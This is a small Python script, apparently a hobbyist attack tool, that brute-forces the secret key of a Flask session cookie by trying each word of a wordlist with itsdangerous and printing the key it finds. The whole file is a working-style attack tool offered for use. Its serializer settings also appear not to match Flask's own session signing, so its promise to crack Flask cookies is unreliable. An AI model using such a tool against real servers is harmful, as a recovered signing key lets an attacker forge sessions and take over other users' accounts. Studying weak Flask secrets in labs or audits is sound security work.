# Amaterasu by Crucifery
import base64
import os
import itsdangerous
from itsdangerous import URLSafeTimedSerializer, BadSignature
from tqdm import tqdm

print("""                           _                           
     /\                   | |                          
    /  \   _ __ ___   __ _| |_ ___ _ __ __ _ ___ _   _ 
   / /\ \ | '_ ` _ \ / _` | __/ _ \ '__/ _` / __| | | |
  / ____ \| | | | | | (_| | ||  __/ | | (_| \__ \ |_| |
 /_/    \_\_| |_| |_|\__,_|\__\___|_|  \__,_|___/\__,_|
                                                       
                                                       """)
print("""天照 by Crucifery for crack Flask cookies""")

def decode(cookies):
    data = cookies.split(".")
    decoding = base64.urlsafe_b64decode(data[0])
    decode_str = decoding.decode('utf-8')
    print(decode_str)

def wordlist_charge(wordlist_path):
    if not os.path.exists(wordlist_path):
        print("Error wordlist path doesn't exist")
        exit()

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        wordlist = [line.strip() for line in f]
        print(f"Wordlist is ready,{len(wordlist)} words")
        return wordlist

def bruteforce(cookies, wordlist):
    for key in tqdm(wordlist, desc="Brute-forcing...."):
        serializer = URLSafeTimedSerializer(key)
        try:
            serializer.loads(cookies)
            print(f"[+] KEY = {key}")
            break
        except BadSignature:
            pass


def main():

    cookies = input("Enter your flask cookies : ")
    wordlist_path = input("Enter your wordlist path : ")

    #decode(cookies)
    wd = wordlist_charge(wordlist_path)
    bruteforce(cookies, wd)

if __name__ == '__main__':
    main()